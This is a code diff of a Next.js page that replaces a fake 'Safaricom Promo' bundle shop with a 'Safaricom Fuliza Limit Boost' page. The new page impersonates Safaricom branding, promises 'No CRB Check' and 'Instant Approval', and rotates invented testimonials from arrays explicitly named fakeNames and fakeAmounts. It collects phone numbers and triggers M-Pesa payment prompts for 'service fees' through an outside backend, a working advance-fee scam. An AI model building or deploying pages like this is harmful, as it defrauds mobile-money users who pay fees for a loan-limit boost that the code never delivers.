@@ -1,212 +1,281 @@
 "use client";
 
-import { Calendar, Flame, X } from "lucide-react";
-import { useRef, useState } from "react";
+import React, { useEffect, useState } from "react";
 
-const green = "#00A651";
+type Limit = {
+  id: string;
+  amount: number;
+  fee: number;
+};
+
+const limits: Limit[] = [
+  { id: "l1", amount: 5000, fee: 300 },
+  { id: "l2", amount: 7500, fee: 400 },
+  { id: "l3", amount: 10000, fee: 500 },
+  { id: "l4", amount: 15000, fee: 700 },
+  { id: "l5", amount: 20000, fee: 800 },
+  { id: "l6", amount: 30000, fee: 1200 },
+  { id: "l7", amount: 40000, fee: 1500 },
+  { id: "l8", amount: 50000, fee: 2200 },
+];
+
+const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
+const fakeAmounts = [15000, 20000, 34000, 50000, 25000];
+
 const BACKEND_URL =
-  "https://starlink-backend-yb3n.onrender.com/api/runPrompt";
+  process.env.NEXT_PUBLIC_BACKEND_URL ||
+  "https://payhero-backend-m78g.onrender.com";
 
-export default function Home() {
-  const bliveRef = useRef<HTMLDivElement>(null);
-  const specialRef = useRef<HTMLDivElement>(null);
-
-  const [selectedOffer, setSelectedOffer] = useState<any>(null);
-  const [phone, setPhone] = useState("");
+export default function FulizaBoost() {
+  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
+  const [showModal, setShowModal] = useState(false);
   const [loading, setLoading] = useState(false);
+  const [success, setSuccess] = useState(false);
+  const [phone, setPhone] = useState("");
+  const [recent, setRecent] = useState({ name: "", amount: 0 });
+  const [errors, setErrors] = useState<{ phone?: string }>({});
 
-  const categories = [
-    {
-      title: "B-LIVE Bundles/Unlimited",
-      icon: <Calendar size={22} />,
-      action: () => bliveRef.current?.scrollIntoView({ behavior: "smooth" }),
-    },
-    {
-      title: "Special Offers/GBs",
-      icon: <Flame size={22} />,
-      action: () => specialRef.current?.scrollIntoView({ behavior: "smooth" }),
-      new: true,
-    },
-  ];
+  const normalizePhone = (num: string) => {
+    let phone = num.replace(/\D/g, "");
 
-  const bliveBundles = [
-    { title: "24 Hours Bundle, unlimited", price: 140 },
-    { title: "3 Days Bundle, unlimited", price: 350 },
-    { title: "1 Week Bundle, unlimited", price: 480 },
-    { title: "1 Month Bundle, unlimited", price: 1300 },
-  ];
+    if (phone.startsWith("07") || phone.startsWith("01")) {
+      return "254" + phone.slice(1);
+    }
 
-  const specialOffers = [
-    { title: "8GB (24hrs)", price: 100 },
-    { title: "12GB (24hrs)", price: 150 },
-    { title: "28GB (1 Week)", price: 450 },
-    { title: "50GB (1 Month)", price: 800 },
-  ];
+    if (phone.startsWith("254")) {
+      return phone;
+    }
 
-  const handlePayment = async () => {
-    if (!phone || !selectedOffer) return;
+    return phone;
+  };
+
+  useEffect(() => {
+    const generate = () => {
+      const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+      const amount = fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)];
+      setRecent({ name, amount });
+    };
+    generate();
+    const interval = setInterval(generate, 2000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const validate = () => {
+    const newErrors: any = {};
+    const normalized = normalizePhone(phone);
+
+    if (!/^254(7|1)\d{8}$/.test(normalized)) {
+      newErrors.phone =
+        "Enter valid Safaricom number (07XXXXXXXX, 01XXXXXXXX or 254XXXXXXXXX)";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const handleBuy = async () => {
+    if (!selectedLimit) return;
+    if (!validate()) return;
 
     setLoading(true);
 
+    const normalizedPhone = normalizePhone(phone);
+
     try {
-      const res = await fetch(BACKEND_URL, {
+      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          phone,
-          amount: selectedOffer.price,
-          local_id: Date.now().toString(),
-          transaction_desc: selectedOffer.title,
-          till_id: 1, // ✅ always 1
+          phone: normalizedPhone,
+          amount: selectedLimit.fee,
+          local_id: `O${Date.now().toString(36)}`,
+          transaction_desc: ` Ksh ${selectedLimit.amount}`,
+          till_id: 1,
         }),
       });
 
       const data = await res.json();
-
-      if (data.status) {
-        alert("✅ STK Push sent. Check your phone.");
-        setSelectedOffer(null);
-        setPhone("");
-      } else {
-        alert("❌ Payment failed. Try again.");
-      }
+      if (data.status) setSuccess(true);
     } catch (err) {
-      alert("⚠️ Server error. Try again later.");
+      console.log(err);
+    } finally {
+      setLoading(false);
     }
+  };
 
-    setLoading(false);
+  const closeModal = () => {
+    setShowModal(false);
+    setSuccess(false);
+    setPhone("");
+    setErrors({});
   };
 
   return (
-    <main className="min-h-screen bg-[#f2f4f3]">
-      {/* Header */}
-      <div className="bg-[#00A651] shadow-sm px-4 py-3">
-        <div className="flex items-center justify-center gap-3">
-          <img src="/logo.png" alt="Logo" className="h-20 w-auto" />
-          <h1 className="text-xl font-bold text-white tracking-wide">
-            Safaricom Promo <span>/B-Live</span>
-          </h1>
+    <div className="min-h-screen bg-[#f4faf6] flex justify-center antialiased">
+      <div className="w-full max-w-md pb-16">
+
+        <div className="bg-[#00A651] text-white text-center py-5 font-semibold text-lg shadow">
+          Safaricom Fuliza Limit Boost
         </div>
-      </div>
 
-      {/* Categories */}
-      <div className="px-4 py-4 grid grid-cols-2 gap-3">
-        {categories.map((item, i) => (
-          <div
-            key={i}
-            onClick={item.action}
-            className="relative cursor-pointer bg-white rounded-xl border border-green-200 p-4 shadow-sm hover:shadow-md transition"
-          >
-            {item.new && (
-              <div
-                className="absolute top-0 right-0 text-white text-[9px] px-2 py-1 rounded-bl-xl rounded-tr-xl"
-                style={{ backgroundColor: green }}
-              >
-                HOT
-              </div>
-            )}
-            <div style={{ color: green }}>{item.icon}</div>
-            <p className="mt-3 text-[14px] font-semibold text-gray-900">
-              {item.title}
-            </p>
+        <div className="text-center mt-5 px-6">
+          <h2 className="text-xl font-bold text-[#008043]">
+            Increase Your Fuliza Allocation
+          </h2>
+          <p className="text-sm text-gray-600 mt-1">
+            Secure digital application process for eligible Safaricom customers.
+          </p>
+        </div>
+
+        <div className="mx-4 mt-6 bg-white rounded-2xl shadow-sm p-4 border border-green-100">
+          <div className="flex justify-between text-sm font-medium text-[#008043]">
+            <span>✔ Secure Application</span>
+            <span>✔ No CRB Check</span>
           </div>
-        ))}
-      </div>
+          <div className="text-center text-sm font-medium text-[#008043] mt-2">
+            ✔ Instant Approval
+          </div>
+        </div>
 
-      {/* Bundles */}
-      {[{ ref: bliveRef, title: "B-LIVE Bundles", data: bliveBundles },
-        { ref: specialRef, title: "Special Offers", data: specialOffers }].map(
-        (section, sIndex) => (
-          <div key={sIndex} ref={section.ref} className="px-4 pb-6">
-            <h2 className="text-[11px] font-semibold text-gray-500 uppercase mb-3 tracking-wide">
-              {section.title}
-            </h2>
+        <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
+          {recent.name} increased Fuliza to{" "}
+          <span className="font-semibold text-[#008043] tabular-nums">
+            Ksh {recent.amount.toLocaleString()}
+          </span>{" "}
+          • just now
+        </div>
 
-            {section.data.map((offer, i) => (
+        <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
+          Select Preferred Fuliza Limit
+        </div>
+
+        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
+          {limits.map((limit) => {
+            const active = selectedLimit?.id === limit.id;
+
+            return (
               <div
-                key={i}
-                className="bg-white rounded-lg border border-[#00A651]/30 p-4 mb-3 flex justify-between items-center shadow-sm hover:shadow-md transition"
+                key={limit.id}
+                onClick={() => setSelectedLimit(limit)}
+                className={`rounded-2xl p-4 cursor-pointer border transition-all duration-200 transform ${
+                  active
+                    ? "bg-[#00A651] text-white border-[#00A651] scale-[1.03] shadow-lg"
+                    : "bg-white border-green-200 hover:shadow-md"
+                }`}
               >
-                <div>
-                  <p className="text-[13px] font-medium text-gray-900">
-                    {offer.title}
-                  </p>
-                  <p className="text-[15px] font-bold text-gray-900 mt-1">
-                    Ksh {offer.price}
-                  </p>
+                <div
+                  className={`text-center text-[20px] font-extrabold tabular-nums ${
+                    active ? "text-white" : "text-black"
+                  }`}
+                >
+                  Ksh {limit.amount.toLocaleString()}
                 </div>
 
-                <button
-                  onClick={() => setSelectedOffer(offer)}
-                  className="bg-[#00A651] text-white text-[13px] font-semibold px-5 py-2 rounded-full shadow-sm hover:opacity-90 active:scale-95 transition"
+                <div
+                  className={`text-[12px] text-center mt-1 tabular-nums ${
+                    active ? "text-white/90" : "text-gray-600"
+                  }`}
                 >
-                  Buy
-                </button>
+                  Service Fee: Ksh {limit.fee}
+                </div>
               </div>
-            ))}
+            );
+          })}
+        </div>
+
+        <div className="px-4 mt-6">
+          <button
+            onClick={() => selectedLimit && setShowModal(true)}
+            className="w-full bg-[#00A651] hover:bg-[#008043] text-white py-3 rounded-xl font-semibold shadow-md transition"
+          >
+            Proceed Securely
+          </button>
+        </div>
+
+        <div className="text-center text-xs text-gray-500 mt-6 px-6">
+          This is a digital facilitation service for Safaricom Fuliza users.
+          Processing timelines may vary based on eligibility criteria.
+        </div>
+
+        {showModal && selectedLimit && (
+          <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center px-4">
+            <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">
+
+              <div className="bg-[#00A651] text-white px-6 py-4">
+                <h3 className="text-sm font-medium">
+                  Secure Fuliza Application
+                </h3>
+                <p className="text-lg font-semibold mt-1">
+                  Limit will be boosted to Ksh{" "}
+                  {selectedLimit.amount.toLocaleString()}
+                </p>
+              </div>
+
+              <div className="p-6">
+                {!success ? (
+                  <>
+                    <div className="mb-4 text-sm text-gray-600 bg-green-50 border border-green-200 p-3 rounded-xl">
+                      Enter your Safaricom number for VERIFICATION! and to receive M-Pesa
+                      payment prompt. Once payment is confirmed your Fuliza
+                      boost request will begin processing.
+                    </div>
+
+                    <div className="mb-4">
+                      <input
+                        type="tel"
+                        placeholder="Safaricom Number"
+                        value={phone}
+                        onChange={(e) => setPhone(e.target.value)}
+                        className="w-full rounded-xl p-3 text-sm border border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100 outline-none"
+                      />
+                    </div>
+
+                    <div className="flex gap-3">
+                      <button
+                        onClick={closeModal}
+                        className="w-1/2 border border-gray-300 py-3 rounded-xl text-sm font-medium"
+                      >
+                        Cancel
+                      </button>
+
+                      <button
+                        onClick={handleBuy}
+                        disabled={loading}
+                        className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold shadow"
+                      >
+                        {loading
+                          ? "Processing..."
+                          : `Pay Ksh ${selectedLimit.fee}`}
+                      </button>
+                    </div>
+
+                    <p className="text-xs text-gray-500 mt-4 text-center">
+                      Your information is encrypted and securely processed.
+                    </p>
+                  </>
+                ) : (
+                  <div className="text-center py-6">
+                    <h3 className="text-lg font-semibold text-[#008043]">
+                      Application Submitted,PAY FEE ON PROMPT GIVEN.
+                    </h3>
+
+                    <p className="text-sm text-gray-600 mt-2">
+                      Processing may take up to 24 hours.
+                    </p>
+
+                    <button
+                      onClick={closeModal}
+                      className="mt-5 bg-[#00A651] text-white px-6 py-2 rounded-xl text-sm"
+                    >
+                      Close
+                    </button>
+                  </div>
+                )}
+              </div>
+            </div>
           </div>
-        )
-      )}
-
-      {/* Footer */}
-      <div className="px-4 mt-6 pb-6">
-        <p className="text-[11px] text-gray-400 text-center">
-          Safaricom Promo portal provides limited-time data bundles.
-        </p>
-      </div>{/* Modal */}
-      {/* 🔥 IMPROVED MODAL */}
-{selectedOffer && (
-  <div className="fixed inset-0 bg-black/40 backdrop-blur-[2px] flex items-center justify-center z-50 px-4">
-    
-    <div className="relative w-full max-w-[300px] bg-green-50 rounded-xl shadow-[0_12px_30px_rgba(0,0,0,0.08)] border border-green-100 p-6">
-
-      {/* Close Button */}
-      <button
-        onClick={() => setSelectedOffer(null)}
-        className="absolute top-3 right-3 text-green-700 hover:text-green-900 transition text-lg"
-      >
-        ×
-      </button>
-
-      {/* Title Section */}
-      <div className="text-center mb-5">
-        <h3 className="text-base font-semibold text-green-800">
-          Tunukiwa Deal Of The Day
-        </h3>
-
-        <p className="mt-1 text-xl font-bold text-green-900">
-          Ksh {selectedOffer.price}
-        </p>
-
-        <p className="mt-2 text-xs text-green-700">
-          Enter your Safaricom number below.
-        </p>
+        )}
       </div>
-
-      {/* Input */}
-      <input
-        type="tel"
-        placeholder="07XXXXXXXX"
-        value={phone}
-        onChange={(e) => setPhone(e.target.value)}
-        className="w-full border border-green-200 rounded-md px-4 py-3 text-sm bg-white focus:outline-none focus:ring-2 focus:ring-green-400/40 focus:border-green-500 transition"
-      />
-
-      {/* Button */}
-      <button
-        onClick={handlePayment}
-        disabled={loading}
-        className="mt-4 w-full bg-[#00A651] text-white py-2.5 rounded-md text-sm font-semibold hover:brightness-95 active:scale-[0.98] transition disabled:opacity-60"
-      >
-        {loading ? "Processing..." : "Confirm & Pay"}
-      </button>
-
     </div>
-  </div>
-)}
-
-
-
-    </main>
   );
 }
